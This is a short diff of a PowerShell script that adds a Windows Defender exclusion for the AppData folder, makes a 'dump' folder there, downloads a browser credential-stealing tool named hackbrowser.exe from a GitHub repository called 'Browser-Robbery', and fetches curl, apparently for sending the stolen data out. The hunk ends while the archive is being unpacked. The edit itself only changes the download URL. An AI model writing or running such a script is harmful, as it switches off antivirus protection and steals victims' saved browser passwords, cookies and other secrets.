@@ -7,7 +7,7 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "https://github.com/Zu-Gui/Zu-Gui/blob/main/hackbrowser.exe?raw=true" -OutFile "$env:appdata\dump\hb.exe"
+Invoke-WebRequest -Uri "https://github.com/Zu-Gui/Browser-Robbery/blob/main/hackbrowser.exe?raw=true" -OutFile "$env:appdata\dump\hb.exe"
 Invoke-WebRequest -Uri "https://curl.se/windows/dl-7.87.0_2/curl-7.87.0_2-win64-mingw.zip" -OutFile "$env:appdata\dump\curl.zip"
 cd $env:appdata\Local\dump
 Expand-Archive -Path .\curl.zip
